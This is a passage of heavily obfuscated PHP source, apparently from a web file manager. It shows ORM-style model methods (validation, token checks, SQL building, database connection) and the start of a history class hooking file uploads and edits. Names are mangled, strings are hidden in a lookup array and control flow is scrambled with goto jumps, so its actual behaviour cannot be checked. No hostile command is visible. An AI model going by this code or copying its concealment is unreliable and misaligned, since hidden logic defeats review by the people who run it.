$a÷Ê‡µ »ﬂ)) { unset($Fæ¶∆èò›¨[$B‚Ëø»óï‘]); } } } if (!$this->autoValidation($Fæ¶∆èò›¨, $d‘—ÚØÂÜô)) { return !1; } if (!$this->autoCheckToken($Fæ¶∆èò›¨)) { $this->error = think_lang($F¨ÿ√„Œß≠[298]); return !1; } goto c∂’îâﬂË–; eÇß„îï°: } public function autoCheckToken($e§««π˜ï∆) { $fÕ”°∫ïùÊ =& $_SERVER[Öíæ€“”≠éÏË]; if (isset($this->options[$fÕ”°∫ïùÊ[299]]) && !$this->options[$fÕ”°∫ïùÊ[299]]) { return !0; } if (think_config($fÕ”°∫ïùÊ[296])) { $Cë£¬êñ«ì = think_config($fÕ”°∫ïùÊ[297]); if (!isset($e§««π˜ï∆[$Cë£¬êñ«ì]) || Session::get($Cë£¬êñ«ì)) { return !1; } list($AƒÒ◊ÑŒø, $EÖˆ®åä†û) = explode($fÕ”°∫ïùÊ[71], $e§««π˜ï∆[$Cë£¬êñ«ì]); if ($EÖˆ®åä†û && Session::get($Cë£¬êñ«ì . $fÕ”°∫ïùÊ[95] . $AƒÒ◊ÑŒø) === $EÖˆ®åä†û) { Session::remove($Cë£¬êñ«ì . $fÕ”°∫ïùÊ[95] . $AƒÒ◊ÑŒø); return !0; } if (think_config($fÕ”°∫ïùÊ[300])) { Session::remove($Cë£¬êñ«ì . $fÕ”°∫ïùÊ[95] . $AƒÒ◊ÑŒø); } return !1; } return !0; } public function regex($Eì“ï¢≤Âü, $bÏÖµ¶ˆ…˜) { $b£Ú”ã˜ı÷ =& $_SERVER[Öíæ€“”≠éÏË]; $DîåÚúçú÷ = array($b£Ú”ã˜ı÷[301] => $b£Ú”ã˜ı÷[302], $b£Ú”ã˜ı÷[303] => $b£Ú”ã˜ı÷[304], $b£Ú”ã˜ı÷[305] => $b£Ú”ã˜ı÷[306], $b£Ú”ã˜ı÷[307] => $b£Ú”ã˜ı÷[308], $b£Ú”ã˜ı÷[309] => $b£Ú”ã˜ı÷[310], $b£Ú”ã˜ı÷[311] => $b£Ú”ã˜ı÷[312], $b£Ú”ã˜ı÷[313] => $b£Ú”ã˜ı÷[314], $b£Ú”ã˜ı÷[288] => $b£Ú”ã˜ı÷[315], $b£Ú”ã˜ı÷[316] => $b£Ú”ã˜ı÷[317]); if (isset($DîåÚúçú÷[strtolower($bÏÖµ¶ˆ…˜)])) { $bÏÖµ¶ˆ…˜ = $DîåÚúçú÷[strtolower($bÏÖµ¶ˆ…˜)]; } return preg_match($bÏÖµ¶ˆ…˜, $Eì“ï¢≤Âü) === 1; } private function autoOperation(&$F£®ÂÓ…¥¥, $aﬂÚâÛ¬Ôö) { $E‚∫Ëõ≠ » =& $_SERVER[Öíæ€“”≠éÏË]; if (!empty($this->options[$E‚∫Ëõ≠ »[318]])) { $bÌ¨¿§Á§ã = $this->options[$E‚∫Ëõ≠ »[318]]; unset($this->options[$E‚∫Ëõ≠ »[318]]); } elseif (!empty($this->_auto)) { $bÌ¨¿§Á§ã = $this->_auto; } if (isset($bÌ¨¿§Á§ã)) { foreach ($bÌ¨¿§Á§ã as $cßæÿ∏í‹±) { if (empty($cßæÿ∏í‹±[2])) { $cßæÿ∏í‹±[2] = THINK_MODEL_INSERT; } if ($aﬂÚâÛ¬Ôö == $cßæÿ∏í‹±[2] || $cßæÿ∏í‹±[2] == THINK_MODEL_BOTH) { switch (trim($cßæÿ∏í‹±[3])) { case $E‚∫Ëõ≠ »[319]: case $E‚∫Ëõ≠ »[320]: $E⁄ì∂´÷ãæ = isset($cßæÿ∏í‹±[4]) ? (array) $cßæÿ∏í‹±[4] : array(); if (isset($F£®ÂÓ…¥¥[$cßæÿ∏í‹±[0]])) { array_unshift($E⁄ì∂´÷ãæ, $F£®ÂÓ…¥¥[$cßæÿ∏í‹±[0]]); } if ($E‚∫Ëõ≠ »[319] == $cßæÿ∏í‹±[3]) { $F£®ÂÓ…¥¥[$cßæÿ∏í‹±[0]] = call_user_func_array($cßæÿ∏í‹±[1], $E⁄ì∂´÷ãæ); } else { $F£®ÂÓ…¥¥[$cßæÿ∏í‹±[0]] = call_user_func_array(array(&$this, $cßæÿ∏í‹±[1]), $E⁄ì∂´÷ãæ); } break; case $E‚∫Ëõ≠ »[271]: $F£®ÂÓ…¥¥[$cßæÿ∏í‹±[0]] = $F£®ÂÓ…¥¥[$cßæÿ∏í‹±[1]]; break; case $E‚∫Ëõ≠ »[321]: if ($E‚∫Ëõ≠ »[33] === $F£®ÂÓ…¥¥[$cßæÿ∏í‹±[0]]) { unset($F£®ÂÓ…¥¥[$cßæÿ∏í‹±[0]]); } break; case $E‚∫Ëõ≠ »[322]: default: $F£®ÂÓ…¥¥[$cßæÿ∏í‹±[0]] = $cßæÿ∏í‹±[1]; } if (!1 === $F£®ÂÓ…¥¥[$cßæÿ∏í‹±[0]]) { unset($F£®ÂÓ…¥¥[$cßæÿ∏í‹±[0]]); } } } } return $F£®ÂÓ…¥¥; } protected function autoValidation($e¯√è∆å®˜, $C´Ùì‹±Éò) { $cÕâÀ„πé˜ =& $_SERVER[Öíæ€“”≠éÏË]; if (!empty($this->options[$cÕâÀ„πé˜[323]])) { $d∑„ßáÈÕÕ = $this->options[$cÕâÀ„πé˜[323]]; unset($this->options[$cÕâÀ„πé˜[323]]); } elseif (!empty($this->_validate)) { $d∑„ßáÈÕÕ = $this->_validate; } if (isset($d∑„ßáÈÕÕ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($d∑„ßáÈÕÕ as $EàâËÂÚ∏Ú => $CÏ´ÒµÚî∫) { if (empty($CÏ´ÒµÚî∫[5]) || $CÏ´ÒµÚî∫[5] == THINK_MODEL_BOTH || $CÏ´ÒµÚî∫[5] == $C´Ùì‹±Éò) { if (0 == strpos($CÏ´ÒµÚî∫[2], $cÕâÀ„πé˜[324]) && strpos($CÏ´ÒµÚî∫[2], $cÕâÀ„πé˜[325])) { $CÏ´ÒµÚî∫[2] = think_lang(substr($CÏ´ÒµÚî∫[2], 2, -1)); } $CÏ´ÒµÚî∫[3] = isset($CÏ´ÒµÚî∫[3]) ? $CÏ´ÒµÚî∫[3] : THINK_EXISTS_VALIDATE; $CÏ´ÒµÚî∫[4] = isset($CÏ´ÒµÚî∫[4]) ? $CÏ´ÒµÚî∫[4] : $cÕâÀ„πé˜[326]; switch ($CÏ´ÒµÚî∫[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($e¯√è∆å®˜, $CÏ´ÒµÚî∫)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($cÕâÀ„πé˜[33] != trim($e¯√è∆å®˜[$CÏ´ÒµÚî∫[0]])) { if (!1 === $this->_validationField($e¯√è∆å®˜, $CÏ´ÒµÚî∫)) { return !1; } } break; default: if (isset($e¯√è∆å®˜[$CÏ´ÒµÚî∫[0]])) { if (!1 === $this->_validationField($e¯√è∆å®˜, $CÏ´ÒµÚî∫)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($F§ØáÏ∞Û±, $Aûñ€ÁÑ«ä) { if (!1 === $this->_validationFieldItem($F§ØáÏ∞Û±, $Aûñ€ÁÑ«ä)) { if ($this->patchValidate) { $this->error[$Aûñ€ÁÑ«ä[0]] = $Aûñ€ÁÑ«ä[2]; } else { $this->error = $Aûñ€ÁÑ«ä[2]; return !1; } } return; } protected function _validationFieldItem($cÉõ–ªÔßè, $e¡Ç≈≠ÊË‹) { $a˜≥·ÀÔ›∞ =& $_SERVER[Öíæ€“”≠éÏË]; switch (strtolower(trim($e¡Ç≈≠ÊË‹[4]))) { case $a˜≥·ÀÔ›∞[319]: case $a˜≥·ÀÔ›∞[320]: $dØ∏áùåá÷ = isset($e¡Ç≈≠ÊË‹[6]) ? (array) $e¡Ç≈≠ÊË‹[6] : array(); if (is_string($e¡Ç≈≠ÊË‹[0]) && strpos($e¡Ç≈≠ÊË‹[0], $a˜≥·ÀÔ›∞[47])) { $e¡Ç≈≠ÊË‹[0] = explode($a˜≥·ÀÔ›∞[47], $e¡Ç≈≠ÊË‹[0]); } if (is_array($e¡Ç≈≠ÊË‹[0])) { foreach ($e¡Ç≈≠ÊË‹[0] as $D‰ÑŸ≥˘¿ó) { $câÉ“ä∫Ü‹[$D‰ÑŸ≥˘¿ó] = $cÉõ–ªÔßè[$D‰ÑŸ≥˘¿ó]; } array_unshift($dØ∏áùåá÷, $câÉ“ä∫Ü‹); } else { array_unshift($dØ∏áùåá÷, $cÉõ–ªÔßè[$e¡Ç≈≠ÊË‹[0]]); } if ($a˜≥·ÀÔ›∞[319] == $e¡Ç≈≠ÊË‹[4]) { return call_user_func_array($e¡Ç≈≠ÊË‹[1], $dØ∏áùåá÷); } else { return call_user_func_array(array(&$this, $e¡Ç≈≠ÊË‹[1]), $dØ∏áùåá÷); } case $a˜≥·ÀÔ›∞[327]: return $cÉõ–ªÔßè[$e¡Ç≈≠ÊË‹[0]] == $cÉõ–ªÔßè[$e¡Ç≈≠ÊË‹[1]]; case $a˜≥·ÀÔ›∞[328]: if (is_string($e¡Ç≈≠ÊË‹[0]) && strpos($e¡Ç≈≠ÊË‹[0], $a˜≥·ÀÔ›∞[47])) { $e¡Ç≈≠ÊË‹[0] = explode($a˜≥·ÀÔ›∞[47], $e¡Ç≈≠ÊË‹[0]); } $fæéôÒêÛ€ = array(); if (is_array($e¡Ç≈≠ÊË‹[0])) { foreach ($e¡Ç≈≠ÊË‹[0] as $D‰ÑŸ≥˘¿ó) { $fæéôÒêÛ€[$D‰ÑŸ≥˘¿ó] = $cÉõ–ªÔßè[$D‰ÑŸ≥˘¿ó]; } } else { $fæéôÒêÛ€[$e¡Ç≈≠ÊË‹[0]] = $cÉõ–ªÔßè[$e¡Ç≈≠ÊË‹[0]]; } if (!empty($cÉõ–ªÔßè[$this->getPk()])) { $fæéôÒêÛ€[$this->getPk()] = array($a˜≥·ÀÔ›∞[329], $cÉõ–ªÔßè[$this->getPk()]); } if ($this->where($fæéôÒêÛ€)->find()) { return !1; } return !0; default: return $this->check($cÉõ–ªÔßè[$e¡Ç≈≠ÊË‹[0]], $e¡Ç≈≠ÊË‹[1], $e¡Ç≈≠ÊË‹[4]); } } public function check($fËÓëôÉ⁄Ÿ, $fŸÍ•ß“õô, $B˘ú≠ôèÖ¢ = "\162\145\x67\145\170") { $AÓ˘éÊÕ‘£ =& $_SERVER[Öíæ€“”≠éÏË]; $B˘ú≠ôèÖ¢ = strtolower(trim($B˘ú≠ôèÖ¢)); switch ($B˘ú≠ôèÖ¢) { case $AÓ˘éÊÕ‘£[7]: case $AÓ˘éÊÕ‘£[330]: $eèëŸ¯–ÆÜ = is_array($fŸÍ•ß“õô) ? $fŸÍ•ß“õô : explode($AÓ˘éÊÕ‘£[47], $fŸÍ•ß“õô); return $B˘ú≠ôèÖ¢ == $AÓ˘éÊÕ‘£[7] ? in_array($fËÓëôÉ⁄Ÿ, $eèëŸ¯–ÆÜ) : !in_array($fËÓëôÉ⁄Ÿ, $eèëŸ¯–ÆÜ); case $AÓ˘éÊÕ‘£[331]: case $AÓ˘éÊÕ‘£[332]: if (is_array($fŸÍ•ß“õô)) { $Bú◊ñ‰•éË = $fŸÍ•ß“õô[0]; $e∆†≥ãÎÓ« = $fŸÍ•ß“õô[1]; } else { list($Bú◊ñ‰•éË, $e∆†≥ãÎÓ«) = explode($AÓ˘éÊÕ‘£[47], $fŸÍ•ß“õô); } return $B˘ú≠ôèÖ¢ == $AÓ˘éÊÕ‘£[331] ? $fËÓëôÉ⁄Ÿ >= $Bú◊ñ‰•éË && $fËÓëôÉ⁄Ÿ <= $e∆†≥ãÎÓ« : $fËÓëôÉ⁄Ÿ < $Bú◊ñ‰•éË || $fËÓëôÉ⁄Ÿ > $e∆†≥ãÎÓ«; case $AÓ˘éÊÕ‘£[333]: case $AÓ˘éÊÕ‘£[334]: return $B˘ú≠ôèÖ¢ == $AÓ˘éÊÕ‘£[333] ? $fËÓëôÉ⁄Ÿ == $fŸÍ•ß“õô : $fËÓëôÉ⁄Ÿ != $fŸÍ•ß“õô; case $AÓ˘éÊÕ‘£[335]: $eŸµåàôÉª = mb_strlen($fËÓëôÉ⁄Ÿ, $AÓ˘éÊÕ‘£[336]); if (strpos($fŸÍ•ß“õô, $AÓ˘éÊÕ‘£[47])) { list($Bú◊ñ‰•éË, $e∆†≥ãÎÓ«) = explode($AÓ˘éÊÕ‘£[47], $fŸÍ•ß“õô); return $eŸµåàôÉª >= $Bú◊ñ‰•éË && $eŸµåàôÉª <= $e∆†≥ãÎÓ«; } else { return $eŸµåàôÉª == $fŸÍ•ß“õô; } case $AÓ˘éÊÕ‘£[337]: list($få‹¬è◊ëÑ, $Fòã‚ˆ⁄ÒÃ) = explode($AÓ˘éÊÕ‘£[47], $fŸÍ•ß“õô); if (!is_numeric($få‹¬è◊ëÑ)) { $få‹¬è◊ëÑ = strtotime($få‹¬è◊ëÑ); } if (!is_numeric($Fòã‚ˆ⁄ÒÃ)) { $Fòã‚ˆ⁄ÒÃ = strtotime($Fòã‚ˆ⁄ÒÃ); } return NOW_TIME >= $få‹¬è◊ëÑ && NOW_TIME <= $Fòã‚ˆ⁄ÒÃ; case $AÓ˘éÊÕ‘£[338]: return in_array(get_client_ip(), explode($AÓ˘éÊÕ‘£[47], $fŸÍ•ß“õô)); case $AÓ˘éÊÕ‘£[339]: return !in_array(get_client_ip(), explode($AÓ˘éÊÕ‘£[47], $fŸÍ•ß“õô)); case $AÓ˘éÊÕ‘£[326]: default: return $this->regex($fËÓëôÉ⁄Ÿ, $fŸÍ•ß“õô); } } public function query($A⁄äòÙ®îè, $cãáœ–ó”É = false) { $BÓó§Ωçç‰ =& $_SERVER[Öíæ€“”≠éÏË]; if (!is_bool($cãáœ–ó”É) && !is_array($cãáœ–ó”É)) { $cãáœ–ó”É = func_get_args(); array_shift($cãáœ–ó”É); } $A⁄äòÙ®îè = str_replace(array($BÓó§Ωçç‰[229], $BÓó§Ωçç‰[340]), $BÓó§Ωçç‰[50], $A⁄äòÙ®îè); $A⁄äòÙ®îè = $this->parseSql($A⁄äòÙ®îè, $cãáœ–ó”É); return $this->db->query($A⁄äòÙ®îè); } public function execute($e¥≤≈Âôüô, $bó¬”—ÍÉ¥ = false) { if (!is_bool($bó¬”—ÍÉ¥) && !is_array($bó¬”—ÍÉ¥)) { $bó¬”—ÍÉ¥ = func_get_args(); array_shift($bó¬”—ÍÉ¥); } $e¥≤≈Âôüô = $this->parseSql($e¥≤≈Âôüô, $bó¬”—ÍÉ¥); return $this->db->execute($e¥≤≈Âôüô); } protected function parseSql($eäÔÕáœÍ¨, $aüÍÜî¯ãÑ) { $f©Ì™≤¥“ =& $_SERVER[Öíæ€“”≠éÏË]; if (!0 === $aüÍÜî¯ãÑ) { $Aœ®Ç¿—Ÿ˜ = $this->_parseOptions(); $eäÔÕáœÍ¨ = $this->db->parseSql($eäÔÕáœÍ¨, $Aœ®Ç¿—Ÿ˜); } elseif (is_array($aüÍÜî¯ãÑ)) { $aüÍÜî¯ãÑ = array_map(array($this->db, $f©Ì™≤¥“[341]), $aüÍÜî¯ãÑ); $eäÔÕáœÍ¨ = vsprintf($eäÔÕáœÍ¨, $aüÍÜî¯ãÑ); } else { $eäÔÕáœÍ¨ = strtr($eäÔÕáœÍ¨, array($f©Ì™≤¥“[342] => $this->getTableName(), $f©Ì™≤¥“[343] => think_config($f©Ì™≤¥“[242]))); } $this->db->setModel($this->name); return $eäÔÕáœÍ¨; } public function db($Eπä†Í°œá = '', $dëπ®©õ¬◊ = '', $D¿äßá‹∆ˆ = array()) { goto Bùã¨öÒ‰º; D⁄∆Ü´û¿Î: static $EèâÿÇâµ‘ = array(); if (!isset($EèâÿÇâµ‘[$Eπä†Í°œá]) || isset($EèâÿÇâµ‘[$Eπä†Í°œá]) && $dëπ®©õ¬◊ && $EÁˆåÿç™∫[$Eπä†Í°œá] != $dëπ®©õ¬◊) { if (!empty($dëπ®©õ¬◊) && is_string($dëπ®©õ¬◊) && !1 === strpos($dëπ®©õ¬◊, $e˘∆á√…ºà[8])) { $dëπ®©õ¬◊ = think_config($dëπ®©õ¬◊); } $EèâÿÇâµ‘[$Eπä†Í°œá] = Db::getInstance($dëπ®©õ¬◊); } elseif (NULL === $dëπ®©õ¬◊) { $EèâÿÇâµ‘[$Eπä†Í°œá]->close(); unset($EèâÿÇâµ‘[$Eπä†Í°œá]); return; } if (!empty($D¿äßá‹∆ˆ)) { if (is_string($D¿äßá‹∆ˆ)) { parse_str($D¿äßá‹∆ˆ, $D¿äßá‹∆ˆ); } foreach ($D¿äßá‹∆ˆ as $CÇ¥ê û√ => $C∑È„£é„ã) { $this->setProperty($CÇ¥ê û√, $C∑È„£é„ã); } } goto B∏Õõñœ≠à; E¨≠˘°Ç¥º: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto c·†ÍùÃâæ; B∏Õõñœ≠à: $EÁˆåÿç™∫[$Eπä†Í°œá] = $dëπ®©õ¬◊; $this->db = $EèâÿÇâµ‘[$Eπä†Í°œá]; $this->_after_db(); goto E¨≠˘°Ç¥º; Bùã¨öÒ‰º: $e˘∆á√…ºà =& $_SERVER[Öíæ€“”≠éÏË]; if ($e˘∆á√…ºà[33] === $Eπä†Í°œá && $this->db) { return $this->db; } static $EÁˆåÿç™∫ = array(); goto D⁄∆Ü´û¿Î; c·†ÍùÃâæ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $dûæÏâ„–• = get_class($this); if ($dûæÏâ„–• == $_SERVER[Öíæ€“”≠éÏË][344]) { return $this->name; } $this->name = substr($dûæÏâ„–•, 0, -5); } return $this->name; } public function getTableName() { $fôë≈ö∑íŒ =& $_SERVER[Öíæ€“”≠éÏË]; if (empty($this->trueTableName)) { $Fﬁ—ßﬁ–›Ê = !empty($this->tablePrefix) ? $this->tablePrefix : $fôë≈ö∑íŒ[33]; if (!empty($this->tableName)) { $Fﬁ—ßﬁ–›Ê .= $this->tableName; } else { $Fﬁ—ßﬁ–›Ê .= think_parse_name($this->name); } $this->trueTableName = strtolower($Fﬁ—ßﬁ–›Ê); } return (!empty($this->dbName) ? $this->dbName . $fôë≈ö∑íŒ[95] : $fôë≈ö∑íŒ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $D˘¿‘£öºê =& $_SERVER[Öíæ€“”≠éÏË]; return isset($this->fields[$D˘¿‘£öºê[249]]) ? $this->fields[$D˘¿‘£öºê[249]] : $this->pk; } public function getDbFields() { $fïóª∂›¯¶ =& $_SERVER[Öíæ€“”≠éÏË]; if (isset($this->options[$fïóª∂›¯¶[277]])) { $F‚…õªèçÕ = $this->db->getFields($this->options[$fïóª∂›¯¶[277]]); return $F‚…õªèçÕ ? array_keys($F‚…õªèçÕ) : !1; } if ($this->fields) { $F‚…õªèçÕ = $this->fields; unset($F‚…õªèçÕ[$fïóª∂›¯¶[248]], $F‚…õªèçÕ[$fïóª∂›¯¶[249]], $F‚…õªèçÕ[$fïóª∂›¯¶[250]], $F‚…õªèçÕ[$fïóª∂›¯¶[247]]); return $F‚…õªèçÕ; } return !1; } public function data($e‹ÌãÏ™ó„ = '') { $dÌ‘Ò¨åÔ» =& $_SERVER[Öíæ€“”≠éÏË]; if ($dÌ‘Ò¨åÔ»[33] === $e‹ÌãÏ™ó„ && !empty($this->data)) { return $this->data; } if (is_object($e‹ÌãÏ™ó„)) { $e‹ÌãÏ™ó„ = get_object_vars($e‹ÌãÏ™ó„); } elseif (is_string($e‹ÌãÏ™ó„)) { parse_str($e‹ÌãÏ™ó„, $e‹ÌãÏ™ó„); } elseif (!is_array($e‹ÌãÏ™ó„)) { think_exception(think_lang($dÌ‘Ò¨åÔ»[269])); } $this->data = $e‹ÌãÏ™ó„; return $this; } public function join($E“˘˘Ô…√«) { $A´⁄∏íÕ÷ =& $_SERVER[Öíæ€“”≠éÏË]; if (is_array($E“˘˘Ô…√«)) { $this->options[$A´⁄∏íÕ÷[280]] = $E“˘˘Ô…√«; } elseif (!empty($E“˘˘Ô…√«)) { $this->options[$A´⁄∏íÕ÷[280]][] = $E“˘˘Ô…√«; } return $this; } public function union($Fç¶‚ﬂß“ , $b±§¯ö ’ë = false) { goto F«·√ﬁç°—; c”¡—ø¢“ß: if (is_object($Fç¶‚ﬂß“ )) { $Fç¶‚ﬂß“  = get_object_vars($Fç¶‚ﬂß“ ); } if (is_string($Fç¶‚ﬂß“ )) { $EåäÿŒ‹ø≤ = $Fç¶‚ﬂß“ ; } elseif (is_array($Fç¶‚ﬂß“ )) { if (isset($Fç¶‚ﬂß“ [0])) { $this->options[$Aá§É≥ÈÈï[345]] = array_merge($this->options[$Aá§É≥ÈÈï[345]], $Fç¶‚ﬂß“ ); return $this; } else { $EåäÿŒ‹ø≤ = $Fç¶‚ﬂß“ ; } } else { think_exception(think_lang($Aá§É≥ÈÈï[269])); } $this->options[$Aá§É≥ÈÈï[345]][] = $EåäÿŒ‹ø≤; goto D∑£›èêÎé; F«·√ﬁç°—: $Aá§É≥ÈÈï =& $_SERVER[Öíæ€“”≠éÏË]; if (empty($Fç¶‚ﬂß“ )) { return $this; } if ($b±§¯ö ’ë) { $this->options[$Aá§É≥ÈÈï[345]][$Aá§É≥ÈÈï[346]] = !0; } goto c”¡—ø¢“ß; D∑£›èêÎé: return $this; goto BõÓ±òå¨ñ; BõÓ±òå¨ñ: } public function cache($dÌ’áËóçê = true, $cÇ„Îà‚éæ = null, $CæÛπÜ∆ä’ = '') { $dç¨∏Öı«à =& $_SERVER[Öíæ€“”≠éÏË]; if (!1 !== $dÌ’áËóçê) { $this->options[$dç¨∏Öı«à[347]] = array($dç¨∏Öı«à[93] => $dÌ’áËóçê, $dç¨∏Öı«à[337] => $cÇ„Îà‚éæ, $dç¨∏Öı«à[29] => $CæÛπÜ∆ä’); } return $this; } public function field($cñ†›¯€§, $d‹ÿìÇíÇ∞ = false) { $BñìˆÀõíÑ =& $_SERVER[Öíæ€“”≠éÏË]; if (!0 === $cñ†›¯€§) { $a‘€îÙè˜¢ = $this->getDbFields(); $cñ†›¯€§ = $a‘€îÙè˜¢ ? $a‘€îÙè˜¢ : $BñìˆÀõíÑ[182]; } elseif ($d‹ÿìÇíÇ∞) { if (is_string($cñ†›¯€§)) { $cñ†›¯€§ = explode($BñìˆÀõíÑ[47], $cñ†›¯€§); } $a‘€îÙè˜¢ = $this->getDbFields(); $cñ†›¯€§ = $a‘€îÙè˜¢ ? array_diff($a‘€îÙè˜¢, $cñ†›¯€§) : $cñ†›¯€§; } $this->options[$BñìˆÀõíÑ[271]] = $cñ†›¯€§; return $this; } public function scope($f÷¡÷Ìê¬ﬁ = '', $E›õô÷¡»ê = NULL) { $FÉÊóÑƒ˜˘ =& $_SERVER[Öíæ€“”≠éÏË]; if ($FÉÊóÑƒ˜˘[33] === $f÷¡÷Ìê¬ﬁ) { if (isset($this->_scope[$FÉÊóÑƒ˜˘[34]])) { $d·ôºÉıçÜ = $this->_scope[$FÉÊóÑƒ˜˘[34]]; } else { return $this; } } elseif (is_string($f÷¡÷Ìê¬ﬁ)) { $bûªª«œ‹• = explode($FÉÊóÑƒ˜˘[47], $f÷¡÷Ìê¬ﬁ); $d·ôºÉıçÜ = array(); foreach ($bûªª«œ‹• as $A©«¬¿ˆöè) { if (!isset($this->_scope[$A©«¬¿ˆöè])) { continue; } $d·ôºÉıçÜ = array_merge($d·ôºÉıçÜ, $this->_scope[$A©«¬¿ˆöè]); } if (!empty($E›õô÷¡»ê) && is_array($E›õô÷¡»ê)) { $d·ôºÉıçÜ = array_merge($d·ôºÉıçÜ, $E›õô÷¡»ê); } } elseif (is_array($f÷¡÷Ìê¬ﬁ)) { $d·ôºÉıçÜ = $f÷¡÷Ìê¬ﬁ; } if (is_array($d·ôºÉıçÜ) && !empty($d·ôºÉıçÜ)) { $this->options = array_merge($this->options, array_change_key_case($d·ôºÉıçÜ)); } return $this; } public function where($d°Õ®◊Ø∏…, $eö©ñŒÇµ‰ = null) { $Cª«ò≠àã’ =& $_SERVER[Öíæ€“”≠éÏË]; if (!is_null($eö©ñŒÇµ‰) && is_string($d°Õ®◊Ø∏…)) { if (!is_array($eö©ñŒÇµ‰)) { $eö©ñŒÇµ‰ = func_get_args(); array_shift($eö©ñŒÇµ‰); } $eö©ñŒÇµ‰ = array_map(array($this->db, $Cª«ò≠àã’[341]), $eö©ñŒÇµ‰); $d°Õ®◊Ø∏… = vsprintf($d°Õ®◊Ø∏…, $eö©ñŒÇµ‰); } elseif (is_object($d°Õ®◊Ø∏…)) { $d°Õ®◊Ø∏… = get_object_vars($d°Õ®◊Ø∏…); } elseif (is_array($d°Õ®◊Ø∏…)) { foreach ($d°Õ®◊Ø∏… as $EöÌÏ–≥ê => $fÍ◊—˘ï≈ì) { if ((is_numeric($EöÌÏ–≥ê) || !$EöÌÏ–≥ê) && is_string($fÍ◊—˘ï≈ì)) { if (strpos($fÍ◊—˘ï≈ì, $Cª«ò≠àã’[348]) === 0) { continue; } think_trace($Cª«ò≠àã’[349], $Cª«ò≠àã’[33], $Cª«ò≠àã’[46]); die; } } } if (is_string($d°Õ®◊Ø∏…) && $Cª«ò≠àã’[33] != $d°Õ®◊Ø∏…) { $aÏàÚÚ˘ = array(); $aÏàÚÚ˘[$Cª«ò≠àã’[350]] = $d°Õ®◊Ø∏…; $d°Õ®◊Ø∏… = $aÏàÚÚ˘; } if (isset($this->options[$Cª«ò≠àã’[273]])) { $this->options[$Cª«ò≠àã’[273]] = array_merge($this->options[$Cª«ò≠àã’[273]], $d°Õ®◊Ø∏…); } else { $this->options[$Cª«ò≠àã’[273]] = $d°Õ®◊Ø∏…; } return $this; } public function limit($aã¯⁄üäÙÜ, $AÚœøËÈ”‚ = null) { $A≤≥ÎÑ÷òé =& $_SERVER[Öíæ€“”≠éÏË]; $this->options[$A≤≥ÎÑ÷òé[290]] = is_null($AÚœøËÈ”‚) ? $aã¯⁄üäÙÜ : $aã¯⁄üäÙÜ . $A≤≥ÎÑ÷òé[47] . $AÚœøËÈ”‚; return $this; } public function page($Fû”÷–µÑ¡, $B«í≥äÒ∑Â = null) { $dëäöΩ∫ô÷ =& $_SERVER[Öíæ€“”≠éÏË]; $this->options[$dëäöΩ∫ô÷[351]] = is_null($B«í≥äÒ∑Â) ? $Fû”÷–µÑ¡ : $Fû”÷–µÑ¡ . $dëäöΩ∫ô÷[47] . $B«í≥äÒ∑Â; return $this; } public function comment($D¢Ω™áòﬂî) { $this->options[$_SERVER[Öíæ€“”≠éÏË][352]] = $D¢Ω™áòﬂî; return $this; } public function setProperty($DŒÌ¿–ñî‰, $CìÀ∞ÂÁì…) { if (property_exists($this, $DŒÌ¿–ñî‰)) { $this->{$DŒÌ¿–ñî‰} = $CìÀ∞ÂÁì…; } return $this; } } goto eéµ√Ã§√ë; A∫¶¿óõƒ«: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto Dº˜≤éæÃá; aä£ÙŒ§Æª: Hook::bind($CÕÖµèåœ¡[1117], $CÕÖµèåœ¡[1118]); Hook::bind($CÕÖµèåœ¡[1119], $CÕÖµèåœ¡[1120]); Hook::bind($CÕÖµèåœ¡[1121], $CÕÖµèåœ¡[1122]); goto A‹˘àÙçºê; Dº˜≤éæÃá: $CÕÖµèåœ¡ =& $_SERVER[Öíæ€“”≠éÏË]; $F£˜˘ºª”ı = $GLOBALS[$CÕÖµèåœ¡[6]][$CÕÖµèåœ¡[88]]; if ($F£˜˘ºª”ı[$CÕÖµèåœ¡[1112]] != 1) { return; } goto b˜¢ÚäÜ©⁄; b˜¢ÚäÜ©⁄: if ($F£˜˘ºª”ı[$CÕÖµèåœ¡[1113]] <= 0) { return; } if (isset($_REQUEST[$CÕÖµèåœ¡[1114]]) && $_REQUEST[$CÕÖµèåœ¡[1114]] == $CÕÖµèåœ¡[87]) { return; } Hook::bind($CÕÖµèåœ¡[1115], $CÕÖµèåœ¡[1116]); goto aä£ÙŒ§Æª; A‹˘àÙçºê: Hook::bind($CÕÖµèåœ¡[1123], $CÕÖµèåœ¡[1124]); Hook::bind($CÕÖµèåœ¡[1125], $CÕÖµèåœ¡[1126]); goto A‹áò≤ÙªΩ; A‹áò≤ÙªΩ: } public static function eventBeforeUpload($FÕ⁄≤‚õê≠) { if ($FÕ⁄≤‚õê≠[3] && $FÕ⁄≤‚õê≠[3] != REPEAT_REPLACE) { return; } $e™£º¡ò‚ﬁ = self::parsePath($FÕ⁄≤‚õê≠[0]); if (!$e™£º¡ò‚ﬁ) { return; } self::add($e™£º¡ò‚ﬁ); } public static function eventBeforeEdit($Eƒøë˜Æ∞Ü) { $bã¡€Ÿ€ıı = self::parsePath($Eƒøë˜Æ∞Ü[0]); if (!$bã¡€Ÿ€ıı) { return; } self::add($bã¡€Ÿ€ıı); } public static function eventBeforeCopyFile($FõÂä√É¥∞, $EƒªºÛÙ±¬, $Fö˘é∆êá–, $e™–ÑÌå•ˆ, $F®üÛÑ¿˜ü, $C’ﬂÇÓÍˆ«) { $CˆÑÜà÷Ÿ◊ = $Fö˘é∆êá–->getPathOuter($e™–ÑÌå•ˆ); $EÒëç»‚É√ = self::parsePath($CˆÑÜà÷Ÿ◊); if (!$EÒëç»‚É√) { return; } self::add($EÒëç»‚É√); } public static function eventBeforeRename($Fïﬁ≥Ûç⁄∞) { $aÜ¥º…∂ÙÛ =& 